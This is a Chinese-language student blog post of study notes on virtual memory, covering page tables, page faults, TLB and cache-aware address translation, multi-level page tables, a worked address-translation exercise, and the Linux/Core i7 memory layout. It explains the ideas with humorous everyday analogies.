<p>其中的一个原因是,内存条太小了,想要把一些磁盘空间也乔装打扮一下当成内存使用</p>
<p>还有更高级的原因,比如更方便地管理内存</p>
<p>虚拟空间是对上层而言的概念,而物理空间是对下层而言的,</p>
<p>用户感到的是虚拟空间,有限的内存上似乎可以运行无限多的进程,开无限多的进程独立地址空间,</p>
<p>而对操作系统来说,实际上的”资源”就只有内存条那固定死的地址空间.</p>
<p>操作系统通过及时地将用户暂时不用的进程的物理空间换给其他进程的虚拟空间使用,让用户产生错觉认为内存很大.</p>
<p>当用户又要继续使用刚才暂时不用的进程时,此时该进程占用的”资源”刚才被操作系统从内存中搬到磁盘中,然后交给了别的进程.</p>
<p>因此操作系统又会启动缺页处理,把磁盘中该进程的信息重新搬回来放到内存中使用.</p>
<p>这就好比用工荒,又好比小学时做过的一道数学题</p>
<blockquote>
<p>400个士兵守一个方形的城池,每时每刻都有士兵阵亡.</p>
<p>如何保证敌人每时每刻看到每面墙上都有至少100个士兵在防守的假象?</p>
<p>400个士兵均分4组站在4个角楼上就可以造成每面城墙有200名士兵的假象</p>
<p>东北角的士兵就同时起到忽悠东面和北面两个方向敌人的作用</p>
<p>在虚拟内存概念中,主存就起到了这个东北角士兵的作用</p>
</blockquote>
<p>虚拟寻址相对于物理寻址多了一个硬件MMU(内存管理单元)和一个步骤即地址翻译.</p>
<p>并且CPU指定的虚拟地址有可能并不放在主存中,而是放在磁盘中,这就发生了缺页,操作系统会一系列操作给他整的不缺喽然后继续执行,这都是后话了</p>
<p>最简化的虚拟寻址模型:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516182852208.png" alt="image-20220516182852208"></p>
<blockquote>
<p>一个相对完整的虚拟寻址过程:</p>
<p>1.CPU指定一个虚拟地址,发往MMU内存管理单元(MMU也是CPU中集成的一部分)</p>
<p>2.MMU将虚拟地址翻译成物理地址,送往地址总线(由于MMU是CPU的一部分,因此还是CPU将该物理地址送往地址总线)</p>
<p>3.CPU指定对该物理地址的读或者写操作,将控制信息送往控制总线</p>
<p>4.CPU通过数据总线对该内存单元进行读或者写操作</p>
</blockquote>
<h2 id="地址空间"><a href="#地址空间" class="headerlink" title="地址空间"></a>地址空间</h2><h3 id="物理地址空间和虚拟地址空间"><a href="#物理地址空间和虚拟地址空间" class="headerlink" title="物理地址空间和虚拟地址空间"></a>物理地址空间和虚拟地址空间</h3><p>一个512MB的内存条上的地址空间即物理地址空间是多大?</p>
<p>一个单元一个字节,$512MB&#x3D;512<em>2^{10}KB&#x3D;512</em>2^{20}B&#x3D;2^{29}B$即物理地址空间编号范围为:$[0,2^{29})$</p>
<p>物理地址空间就是内存条上的地址空间数</p>
<p>虚拟地址空间是指想要给用户造成的假象中,让用户感觉出来的内存大小,实际上是磁盘上的一个连续巨大数组</p>
<blockquote>
<p>还是以士兵守城举例,一共400个活人,每面墙上分100个士兵,不可能再多了,这就是物理地址空间</p>
<p>但是士兵都站在角楼可以造成每面墙都有200个士兵的假象,这就是虚拟空间</p>
</blockquote>
<p>通常虚拟地址空间会比物理空间大,否则虚拟空间没有存在的意义</p>
<blockquote>
<p>绷不住了</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516204149979.png"></p>
</blockquote>
<p>为什么不直接把物理空间做大?物理空间即内存条,相对磁盘贵得多.如果有钱自然可以整一个不用磁盘,只用内存(还涉及到断点是否能保存的问题)的计算机,现在对于私人电脑而言,比如联想拯救者y9000p2021h,显然不现实</p>
<h3 id="数据对象和地址空间的关系"><a href="#数据对象和地址空间的关系" class="headerlink" title="数据对象和地址空间的关系"></a>数据对象和地址空间的关系</h3><p>数据对象就是存放在地址空间上的数据,其在地址空间中的位置或者说下标就是其属性</p>
<p>比如一个char一个字节,存放在一个内存单元中,</p>
<p>一个int四个i直接,存放在四个连续的内存单元中,</p>
<p>每个数据对象都会有一个虚拟地址空间地址,当其所在进程被实际运行时,它有可能在物理空间中有一个物理空间地址</p>
<h2 id="虚拟内存作为缓存工具"><a href="#虚拟内存作为缓存工具" class="headerlink" title="虚拟内存作为缓存工具"></a>虚拟内存作为缓存工具</h2><h3 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h3><p>虚拟空间比物理空间大,自然不能一股脑塞进物理空间里.</p>
<p>应该是用到虚拟空间的某一块就从虚拟空间中把这一块搬到物理空间中</p>
<blockquote>
<p>这就好比一个有5个坑的厕所但是有20个人要扔炸弹,自然要挑最急或者最先排队的5个人去扔炸弹,20个人一起扔炸弹有很大可能把炸弹扔别人身上或者扔外边</p>
</blockquote>
<p>这里选5个人一组去扔炸弹就好比从虚拟空间中选出一部分块放到物理内存中接收CPU的访问</p>
<blockquote>
<p>为什么CPU不能直接去磁盘访问?</p>
<p>这从量上举例</p>
<p>就好比中国有13亿人口就要挖13个上厕所的坑,</p>
<p>其一正常人不是每时每刻都在扔炸弹,就好比磁盘中的数据不是每时每刻都要被CPU访问</p>
<p>其二建13亿个厕所走到路上得随处可见的坑(我密恐犯了),类比计算机中就需要从CPU到磁盘之间部署总线,磁盘一般比较大,比如1个T,那么地址总线宽度就得$log_2 1T$</p>
<p>从质上举例子,内存速度远快于磁盘,</p>
<p>CPU去访问内存,然后内存去访问磁盘,就好比师长向团长下达命令,团长去团里下命令,要找士兵许三多,</p>
<p>但是CPU去访问磁盘就好比师长直接向师广大士兵下达命令,找许三多这个人.</p>
</blockquote>
<p>规范的术语:</p>
<p>虚拟内存(Virtual memory,VM)</p>
<p>物理内存分割成的块叫做物理页(Physical Page,PP)</p>
<p>虚拟内存分割成的块叫做虚拟页(Virtual Page,VP)</p>
<p>虚拟内存分割成块是因为物理内存放不下,那为什么物理内存也要分块?</p>
<blockquote>
<p>这就好比20个人去一个10个坑厕所扔炸弹,20个人里有10男10女,扔炸弹这种事做不到男女搭配干活不累,需要5个坑放在男厕所,5个坑放在女厕所,然后10男分两组去男厕扔炸弹,女同理</p>
<p>都是人但是因为性别就得分开扔炸弹</p>
<p>有些连续虚拟内存块就得分开了放到物理内存里</p>
</blockquote>
<p>虚拟内存中的一个虚拟页在被使用的时候要搬到物理内存中,复制到一个物理页上,</p>
<p>用不到的虚拟页其对应的物理页有可能就被让给其他虚拟页使用</p>
<p>可以说某一时刻一个正在被使用的物理页是一个虚拟页的快照,</p>
<p>当然物理页可以修改,这会导致物理页和其对应的虚拟页内容有差异,这种情况下应该怎么办呢?当该物理页将要被让给其他虚拟页时需要将改动写回其对应的虚拟页</p>
<h3 id="页属性"><a href="#页属性" class="headerlink" title="页属性"></a>页属性</h3><p>页属性:物理页和虚拟页有相同的大小$P&#x3D;2^p$字节</p>
<p>由于物理地址空间比虚拟地址空间小,因此显然物理页数量比虚拟页数量少</p>
<p>根据虚拟页是否被使用以及是否正在被使用,虚拟页可以分成三种</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516193505725.png" alt="image-20220516193505725"></p>
<p>分配与否就是指该虚拟页是否存储了信息</p>
<p>缓存与否就是该虚拟页是否被复制到物理页供CPU访问</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516193749579.png" alt="image-20220516193749579"></p>
<blockquote>
<p>什么是缓存?</p>
<p>看电影的时候也会遇到”缓存”这个概念,缓存有点一劳永逸的概念,第一次加载需要花费一些时间,但是以后对相同内容的重复访问就快得多了</p>
<p>什么叫”缓存在DRAM中”,就是指虚拟页已经拷贝到内存上建立了物理页,方便CPU直接访问内存而不用与磁盘打交道</p>
<p>因此内存条在存储系统中可以看成是CPU和磁盘之间的缓存器,就好比cache是CPU和磁盘之间的缓存器,只不过内存比cache大得多慢得多</p>
</blockquote>
<p>显然VP数量多与PP,VP的二进制地址编号更长</p>
<h3 id="幼年的页表"><a href="#幼年的页表" class="headerlink" title="幼年的页表"></a>幼年的页表</h3><p>CPU或者说虚拟内存系统怎么知道它想要访问的虚拟页是否已经被拷贝到内存条上成为物理页了呢?</p>
<blockquote>
<p>这就好比班主任要约谈某个倒霉蛋,但是班主任怎么知道这个倒霉蛋有没有来学校呢?班主任会先看一下签到表判断一下倒霉蛋来没来,来了则直接约谈,没来则先从家里叫到学校然后再约谈</p>
</blockquote>
<p>让虚拟内存系统掌握目前有哪些虚拟页拷贝成了物理页,要在&#x3D;&#x3D;主存上&#x3D;&#x3D;放一个页表(Page Table,PT)</p>
<blockquote>
<p>为什么要放到主存上?</p>
<p>还能放到哪里呢?CPU的寄存器里?磁盘里?</p>
<p>寄存器稀松了了的几个,每一个最多存放一个64位数4字节,而一个页表表项数成千上万,每个表项都是以字节为单位.显然CPU寄存器放不开?</p>
<p>放磁盘里那和CPU直接访问磁盘上的数据有啥区别?</p>
<p>也只能放在内存里了</p>
</blockquote>
<p>页表项(PTE)数是根据虚拟内存确定的,虚拟页有几个,就有多少个页表项</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516194906654.png" alt="image-20220516194906654"></p>
<p>页表项按照顺序表方式排列,下标从0到<code>虚拟页数-1</code>,与虚拟页一一对应</p>
<p>有效位表明该虚拟页是否已经在物理内存中创建了物理页,</p>
<p>页表项剩下的部分是物理页号,光知道一个虚拟页创建了一个物理页还不够,还得知道这个物理页在哪里</p>
<blockquote>
<p>这就好比20个爷们去只有5个坑的男厕扔炸弹,厕所所长为了方便惩罚扔不准炸弹的爷们,给五个坑标上0,1,2,3,4,然后让每个人扔炸弹的时候报告自己对哪个坑输出,</p>
<p>然后厕所所长记录一张如厕表,<code>坑[0]=老八,坑[1]=张三...</code>就能根据坑号责任到人,</p>
<p>如果1号坑的爷们占着坑不扔炸弹,所长就则给外面的人说1号坑闲置,来个爷们把上一个爷们给挤掉</p>
<p>如果1号坑的爷们快速地扔完炸弹走了,所长就把1号坑标记为闲置状态</p>
</blockquote>
<p>之所以说”幼年的页表”,是因为实际上的页表项目还要记录很多信息,这里只是最简化的页表</p>
<h3 id="页命中"><a href="#页命中" class="headerlink" title="页命中"></a>页命中</h3><p>CPU想要访问某个虚拟地址,但是这个虚拟地址对应的页是否已经被缓存到内存中了呢?</p>
<p>如果是则”命中”</p>
<blockquote>
<p>这就好比20个爷们去一个5坑男厕,一个找茬想让老八表演绝活,但是绝活只能靠在厕所中食用炸弹完成,于是找茬的去问所长,老八是否正在坑上,</p>
<p>所长也挺好奇的,查了一下如厕表,发现<code>坑[0]=老八</code>,老八确实正在扔炸弹,这就命中了</p>
<p>否则所长就要让外面的老八挤掉一个站着茅坑不扔炸弹的张三然后表演绝活</p>
</blockquote>
<p>在计算机上怎么判定是不是呢?</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516200840582.png" alt="image-20220516200840582"></p>
<p>根据CPU给出的虚拟地址首先查虚拟页表,先看有效位,如果为1则命中,根据页表项后面的物理页号去物理内存中去访问物理页</p>
<p>如果有效位为0则表明该虚拟地址对应的页还没有拷贝到物理内存里,触发缺页异常,这都是后话了</p>
<blockquote>
<p>虚拟地址和虚拟页的关系?</p>
<p>虚拟页是一个虚拟单元集合,一个虚拟页集合了一些连续的虚拟单元,每个虚拟单元都有一个虚拟地址</p>
<p>虚拟页的地址就是第一个虚拟单元的虚拟地址</p>
<p>因此给定一个虚拟地址查页表的时候应该是查询该虚拟地址是否属于某个虚拟页的<strong>辖区</strong></p>
</blockquote>
<h3 id="缺页"><a href="#缺页" class="headerlink" title="缺页"></a>缺页</h3><p>没有命中的情况就是缺页</p>
<p><strong>什么情况下判定为缺页?</strong></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516201903715.png" alt="image-20220516201903715"></p>
<p>cpu指定的虚拟地址查页表后发现有效位为0,立刻引发缺页中断</p>
<p><strong>缺页了怎么整才能让它不缺?</strong></p>
<p>我原来认为缺页了CPU就直接越俎代庖地去访问磁盘了,这经过前文的学习显然是想当然</p>
<p>缺页之后选择一个”不是很重要”的物理页(比如PP3)给他扬了,修改指向该物理页PP3的页表项PTE4,有效位置0,</p>
<blockquote>
<p>此举的目的是当先前的虚拟页VP4再次使用时,需要重新拷贝到物理页.如果此时不即使修改PTE4的有效位则再次使用VP4时一查表,发现已经缓存好了,直接访问PP3了,可是PP3实际上是VP3的拷贝</p>
</blockquote>
<blockquote>
<p>这里”选择一个不是很重要的物理页”涉及到页面调度算法,这是另一本黑叔叔,&lt;&lt;现代操作系统&gt;&gt;中的内容</p>
</blockquote>
<p>然后用需要用到的虚拟页VP3拷贝到该物理页PP3位置,挤掉VP4,</p>
<p>修改对应的页表项PP4,有效位 置1然后物理页表地址写上刚才拷贝到的物理页的地址PP3</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516202424662.png" alt="image-20220516202424662"></p>
<p>都改完之后,重新执行刚才的指令,此时虚拟地址就已经被缓存了,不会再发生缺页了</p>
<p>一些规范术语:</p>
<p>交换或者页面调度:再内存和磁盘之间传送页</p>
<p>页面调入或者磁盘换入,页从磁盘传送到内存,方向都是相对于内存而言的,</p>
<blockquote>
<p>方向总是相对于更靠近CPU的器件而言的</p>
</blockquote>
<p>按需页面调度:只有不得不进行页面调度即发生了缺页时,才进行页面调度的调度方式</p>
<blockquote>
<p>现代操作系统一般使用按需页面调度</p>
</blockquote>
<h2 id="虚拟内存作为内存管理工具"><a href="#虚拟内存作为内存管理工具" class="headerlink" title="虚拟内存作为内存管理工具"></a>虚拟内存作为内存管理工具</h2><p>每个进程都有自己独立的&#x3D;&#x3D;虚拟&#x3D;&#x3D;地址空间,注意不是物理地址空间</p>
<p>这就要求每个进程都有独立的页表</p>
<p>物理空间只有一个,就是内存条,或者说主存</p>
<p>进程的虚拟地址空间看似是连续地开了一大片,实际上有可能在物理内存上东一块西一块.</p>
<p>不同的进程可以有共享的物理页,这时动态库的物质基础</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516205620915.png" alt="image-20220516205620915"></p>
<blockquote>
<p>这里有一个问题,如果两个进程的代码段都是从虚拟地址的<code>0x400000</code>开始,岂不是对应了磁盘上的同一虚拟页?</p>
<p>&#x3D;&#x3D;可以提出一种猜想&#x3D;&#x3D;</p>
<p>进程的虚拟地址空间是要小于磁盘上全部的虚拟地址空间的</p>
<p>进程的虚拟地址并不是磁盘上的虚拟地址空间的下标,</p>
<p>而是相对于磁盘上几个连续的页面组成的一个子虚拟地址空间而言的</p>
<p>该子虚拟空间从0开始重新编号</p>
</blockquote>
<h2 id="虚拟内存作为内存保护工具"><a href="#虚拟内存作为内存保护工具" class="headerlink" title="虚拟内存作为内存保护工具"></a>虚拟内存作为内存保护工具</h2><p>啥是内存保护?</p>
<p>比如用户不允许修改内核的数据</p>
<p>只读数据无法被修改,代码段也不许被修改</p>
<p>不允许修改其他内存的虚拟地址空间</p>
<blockquote>
<p>进程的虚拟地址空间独立,很自然的就保证了进程不允许修改其他内存的虚拟地址空间,</p>
<p>这就好比让两个在水上步行球中的人打架,两个球距离最近也就是相切,不会相互嵌入</p>
<p>这个球就好比进程独立的虚拟地址空间</p>
</blockquote>
<p>…</p>
<p>幼年的页表成熟了一些,成了带许可位的页表</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516210523521.png" alt="image-20220516210523521"></p>
<p>在页表项中加上许可位,就可以限制进程对该页读写访问,</p>
<p>sup许可位限制普通用户和管理员的区别</p>
<p>违反这些许可条件的指令将会导致段错误</p>
<h2 id="地址翻译-1"><a href="#地址翻译-1" class="headerlink" title="地址翻译"></a>地址翻译</h2><p>符号约定</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516225933019.png" alt="image-20220516225933019"></p>
<p>地址翻译就是从虚拟地址计算出物理地址的过程</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516214911937.png" alt="image-20220516214911937"></p>
<blockquote>
<p> 咱就是说这个MAP函数这么抽象有必要这样写一下吗</p>
</blockquote>
<p>这个映射是在MMU中完成的</p>
<h3 id="最简单的地址翻译"><a href="#最简单的地址翻译" class="headerlink" title="最简单的地址翻译"></a>最简单的地址翻译</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516220103992.png" alt="image-20220516220103992"></p>
<p>每个进程可以有自己的独立页表,需要一个页表基址寄存器指向页表基地址,作用类似于段寄存器</p>
<blockquote>
<p>一个精确到存储单元的虚拟地址分成虚拟页号和虚拟页偏移量两部分</p>
<p>确定到页用到页号,确定到页上的一个单元需要页偏移量</p>
<p>由于物理页大小和虚拟页大小相同,因此物理页偏移量和虚拟页偏移量是相同的</p>
<p>虚拟页数量一般会大于物理页数量,因此虚拟页号长度一般长于物理页号,即$n&gt;m$</p>
</blockquote>
<p>翻译过程:</p>
<p>1.CPU指定一个虚拟地址给MMU</p>
<p>2.MMU将该虚拟地址的$[p,n-1]$位作为虚拟页号去查页表,剩下$[0,p-1]$位作为页偏移量</p>
<p>3.虚拟页号查页表对应项,如果有效位是0则缺页中断,否则命中,如果命中则:</p>
<p>4.从页表中读取物理页号$[p,m-1]$,和页偏移量$[0,p-1]$拼成物理地址</p>
<p>5.CPU将该物理地址放到地址总线上,准备访问内存</p>
<h3 id="考虑高速缓存的地址翻译"><a href="#考虑高速缓存的地址翻译" class="headerlink" title="考虑高速缓存的地址翻译"></a>考虑高速缓存的地址翻译</h3><p>原来的地址翻译,CPU直接访问内存,现在在CPU和内存之间再加一级缓存,L1高速缓存</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516221624510.png" alt="image-20220516221624510"></p>
<p>处理器只能发出虚拟地址,MMU翻译成物理地址,处理器不能直接发出物理地址</p>
<p>页表还是存放在内存中,高速缓存存放的是很少一部分的<strong>页表项目</strong>还有<strong>数据</strong></p>
<p>1.处理器发出虚拟地址VA之后进入MMU进行翻译,得到一个虚拟页号</p>
<p>2.如果没有L1则下一步要根据虚拟页号,到内存中访问页表了,而现在有L1,要先检查L1中有没有该虚拟页号对应的页表条目.</p>
<p>3.如果L1命中,并且对应页表条目有效位为1,则不再访问内存,直接从L1中取出该页表条目的<strong>物理页号</strong>给MMU.</p>
<p>4.如果L1不命中,则还需访问内存,从真正的页表中找到该虚拟页号对应的页表条目,然后根据有效位判断是否缺页,</p>
<p>如果内存也命中即有效位为1则不缺页,将该<strong>页表条目</strong>返回L1,从L1中挤出一条相对不重要的记录.</p>
<p>然后MMU再访问L1获得页表条目的物理页号,(这次L1必然命中),然后拼成物理地址</p>
<p>如果发生缺页,也是内存和磁盘之间页的传递,与L1没有关系,无需讨论</p>
<p><strong>然后CPU访问物理地址也因L1有所变化</strong></p>
<p>在没有L1时,MMU拿到物理地址之后会加到地址总线上,但是现在MMU拿到物理地址后还是会先查L1,如果L1命中,则直接取出数据通过内部总线传递给CPU,免去了访问内存和外总线的过程</p>
<p>当L1不命中时才会查内存上的物理地址,然后取出其上的地址,然后在L1中挤掉一个相对不重要的记录,存入该物理地址及其数据的键值对</p>
<h3 id="TLB加速翻译的地址翻译"><a href="#TLB加速翻译的地址翻译" class="headerlink" title="TLB加速翻译的地址翻译"></a>TLB加速翻译的地址翻译</h3><p>TLB:翻译后备缓冲器(Translation Lookaside Buffer)</p>
<p>这个玩意儿是加速翻译的,啥意思呢.</p>
<blockquote>
<p>如果五秒前我问了别人,”你好”用英语怎么说并获得了回答,</p>
<p>五秒后我要对一个米国人打招呼,这时需要翻译</p>
<p>但凡比鱼聪明点的人都还记得”你好”用英语怎么说,这就是TLB命中</p>
<p>但是如果五秒前我尝试寄了十个甚至更多的英语单词,其中即使包括”你好”,五秒后我也不一定能想起来,这就是后来的翻译挤掉了前面翻译的缓存,然后TLB不命中</p>
<p>此时想不起来就应该再问懂哥儿,”你好”用英语怎么说,然后记住,方便奉承下一个米国人用,这就是TLB不命中之后干的事</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516224400351.png" alt="image-20220516224400351"></p>
<p>处理器指定一个虚拟地址交给MMU,MMU首先不会尝试查L1或者内存中的页表进行翻译,而是首先访问TLB,看看刚才是不是已经翻译过并且还记得,如果命中则直接用刚才记住的翻译得到物理地址</p>
<p>如果TLB没有命中则老老实实去查高速缓存页表项,要是再不命中则老老实实去查内存页表,要是还不命中则缺页</p>
<p>可气的是,总有一伙子人能设计地这些缓冲几乎百发百中</p>
<h3 id="手工模拟地址翻译"><a href="#手工模拟地址翻译" class="headerlink" title="手工模拟地址翻译"></a>手工模拟地址翻译</h3><h4 id="题目环境"><a href="#题目环境" class="headerlink" title="题目环境"></a>题目环境</h4><p>考虑上TLB,L1缓存,手工模拟一个地址翻译过程</p>
<p>系统参数:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516232636330.png" alt="image-20220516232636330"></p>
<p>这里几路相联,几个组实际上就是将线性的缓存器改成了阵列,按照行列存储</p>
<blockquote>
<p>每个页面大小$64Bytes&#x3D;2^6Bytes$,一个内存单元$1Bytes$,因此一个页管理$2^6$个地址,页内偏移量就得是一个6位二进制数,剩下的高位才是页号</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516232919987.png" alt="image-20220516232919987"></p>
</blockquote>
<blockquote>
<p>TLB中缓存的是刚才查过的翻译,可以认为是<code>[VPN,PPN]</code>键值对,MMU给出一个VPN,如果TLB中有键为该VPN的键值对,则TLB给出PPN值,此时TLB命中,</p>
<p>否则TLB不命中则需要查L1或者内存页表进行地址翻译</p>
<p>这里给出了一个假定的TLB缓存情况</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516233348777.png" alt="image-20220516233348777"></p>
</blockquote>
<blockquote>
<p>页表是单级结构,这里给出了假定的页表的情况</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516233340796.png" alt="image-20220516233340796"></p>
</blockquote>
<blockquote>
<p>高速缓存L1通过物理地址字段进行寻址,这里给出了假定的缓存情况</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516233523416.png" alt="image-20220516233523416"></p>
</blockquote>
<h4 id="将虚拟地址0x03d7翻译成物理地址"><a href="#将虚拟地址0x03d7翻译成物理地址" class="headerlink" title="将虚拟地址0x03d7翻译成物理地址"></a>将虚拟地址<code>0x03d7</code>翻译成物理地址</h4><h5 id="0xA虚拟地址格式"><a href="#0xA虚拟地址格式" class="headerlink" title="0xA虚拟地址格式"></a>0xA虚拟地址格式</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516235021410.png" alt="image-20220516235021410"></p>
<h5 id="0xB地址翻译"><a href="#0xB地址翻译" class="headerlink" title="0xB地址翻译"></a>0xB地址翻译</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516235143678.png" alt="image-20220516235143678"></p>
<p>TLB命中,物理页号<code>0x0D</code>拼接页偏移得到物理地址</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516235504854.png" alt="image-20220516235504854"></p>
<p>只要是TLB中能找到的记录,都不会缺页,这是因为,最近的记忆会挤掉老的记忆,TLB中只要能找到,说明最近被翻译过</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>值</th>
</tr>
</thead>
<tbody><tr>
<td>VPN</td>
<td><code>0xf</code></td>
</tr>
<tr>
<td>TLB索引(TLBi)</td>
<td><code>0x3</code></td>
</tr>
<tr>
<td>TLB标记(TLBt)</td>
<td><code>0x3</code></td>
</tr>
<tr>
<td>TLB命中?</td>
<td>是</td>
</tr>
<tr>
<td>缺页</td>
<td>否</td>
</tr>
<tr>
<td>PPN</td>
<td><code>0xd</code></td>
</tr>
</tbody></table>
<h5 id="0xC物理地址格式"><a href="#0xC物理地址格式" class="headerlink" title="0xC物理地址格式"></a>0xC物理地址格式</h5><table>
<thead>
<tr>
<th>0</th>
<th>0</th>
<th>1</th>
<th>1</th>
<th>0</th>
<th>1</th>
<th>0</th>
<th>1</th>
<th>0</th>
<th>1</th>
<th>1</th>
<th>1</th>
</tr>
</thead>
</table>
<h5 id="0xD物理内存引用"><a href="#0xD物理内存引用" class="headerlink" title="0xD物理内存引用"></a>0xD物理内存引用</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517000150935.png" alt="image-20220517000150935"></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517000501697.png" alt="image-20220517000501697"></p>
<p>缓存命中</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>值</th>
</tr>
</thead>
<tbody><tr>
<td>字节偏移CO</td>
<td><code>0x3</code></td>
</tr>
<tr>
<td>缓存索引CI</td>
<td><code>0x5</code></td>
</tr>
<tr>
<td>缓存标记CT</td>
<td><code>0xD</code></td>
</tr>
<tr>
<td>缓存命中</td>
<td>是</td>
</tr>
<tr>
<td>返回的缓存字节</td>
<td><code>0x1D</code></td>
</tr>
</tbody></table>
<h3 id="多级页表的地址翻译"><a href="#多级页表的地址翻译" class="headerlink" title="多级页表的地址翻译"></a>多级页表的地址翻译</h3><h4 id="以两级页表为例"><a href="#以两级页表为例" class="headerlink" title="以两级页表为例"></a>以两级页表为例</h4><p>单级页表 的时候,一条页表项对应一个虚拟页,一张页表就可以管理整个虚拟内存的页</p>
<p>如果虚拟地址空间更大,页更多,则页表项目更多,而页表也是存放在内存中的,如果页表也大到内存装不下该当如何?</p>
<blockquote>
<p>这就好比刚上大学的时候所有的<strong>学习资料</strong>都可以放在一个文件夹里</p>
<p>但是日积月累,学习资料文件夹变得臃肿,想要找到一个文件就像大海捞针</p>
<p>因此应该建立子文件夹,比如<code>/reverse</code>,<code>/pwn</code>,<code>/web</code>等等</p>
<p>时间长了每个子文件夹又会臃肿,又可以根据时间或者难易程度建立子子文件夹</p>
</blockquote>
<p>高级页表的表项是低级页表的索引</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516231018326.png" alt="image-20220516231018326"></p>
<p>这里二级页表和前面的单级页表作用类似,直接索引虚拟页,但是也有些许区别</p>
<blockquote>
<p>单级页表结构中只有一个页表,第i个页表项就指向第i个虚拟页</p>
</blockquote>
<p>这里二级页表有多个,每个二级页表只对应虚拟内存中的连续的1024个虚拟页,二级页表的表项都是从0开始编号的但是虚拟内存中的页是统一编号的</p>
<p>一级页表的作用是索引二级页表</p>
<p>一级页表的表项,其有效位标志着对应二级页表对应的1024个虚拟页都没有被缓存过</p>
<blockquote>
<p>但凡这1024个虚拟页中有一个被缓存,其在二级页表中的表项的有效位为1,则该二级页表对应一级页表中的表项有效位就得是1</p>
</blockquote>
<p>只有一级页表是常驻内存的,只有有效位为1表项对应的二级页表才会被搬进内存,不用的时候还得被挤出去</p>
<h4 id="k级页表的地址翻译"><a href="#k级页表的地址翻译" class="headerlink" title="k级页表的地址翻译"></a>k级页表的地址翻译</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220516231949258.png" alt="image-20220516231949258"></p>
<p>一级页表表项中存放的是二级页表的索引,二级页表表项中存放的是三级页表的索引,以此类推,直到最低级页表,其表项才是物理地址,</p>
<p>从高级页表一直索引到低级页表的过程中,但凡有一个页表项的有效位为0则引发缺页</p>
<p>缺页也是逐级修复的,</p>
<p>只有最低级页表项才存放实际的物理页号,然后物理页号和页偏移拼起来组成物理地址</p>
<p>可气的是,虽然有这么多级,但是总有人能设计得它的速度能和单级页表媲美</p>
<h3 id="英特尔酷睿i7-Linux内存系统地址翻译"><a href="#英特尔酷睿i7-Linux内存系统地址翻译" class="headerlink" title="英特尔酷睿i7&#x2F;Linux内存系统地址翻译"></a>英特尔酷睿i7&#x2F;Linux内存系统地址翻译</h3><p>多级页表结构,每个进程允许有自己私有的页表层次结构</p>
<p>页大小采用4KB,四级页表结构</p>
<p>这里第一次见到”CR3控制寄存器”,其作用是指向一级页表的起始位置,CR3是每个进程上下文的一部分,每个进程都有自己独立的页表结构,执行A进程时CR3就应该指向A进程的一级页表起始位置</p>
<blockquote>
<p>一级页表可以有多个吗?</p>
<p>还是说只有一个一级页表,管理所有的二级页表,然后进程从二级页表开始有自己的独立地址空间</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517073701065.png" alt="image-20220517073701065"></p>
<p>高级页表(除了直接管理虚拟内存的最低级页表),其结构如下:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517073820824.png" alt="image-20220517073820824"></p>
<p>最低级页表结构如下</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517073849861.png" alt="image-20220517073849861"></p>
<h2 id="Linux虚拟内存系统"><a href="#Linux虚拟内存系统" class="headerlink" title="Linux虚拟内存系统"></a>Linux虚拟内存系统</h2><p>进程的虚拟内存</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517074643634.png" alt="image-20220517074643634"></p>
<p>进程虚拟内存部分(用户栈向下)是进程的独立的虚拟地址空间,</p>
<p>内核虚拟空间被所有进程共享,共享的实现是通过页表的一些表项指向相同的物理地址,然后页表项上标明内核虚拟内存只读</p>
<p>共享库等技术的实现也是基于虚拟内存的,但都是后话了</p>
<h3 id="Linux虚拟内存区域组成"><a href="#Linux虚拟内存区域组成" class="headerlink" title="Linux虚拟内存区域组成"></a>Linux虚拟内存区域组成</h3><p>虚拟内存分段,被分段的虚拟内存区域就一定已经被分配了</p>
<p>只要是存在的虚拟页就一定属于某个段,</p>
<p>未使用的虚拟页不会被记录,没有页表指向该位置</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220517080056415.png" alt="image-20220517080056415"></p>
<p><code>task_struct</code>指向内核运行该进程的所有信息</p>
<blockquote>
<p>PID,指向用户栈的指针rsp,可执行目标文件名字,程序计数器rip</p>
</blockquote>
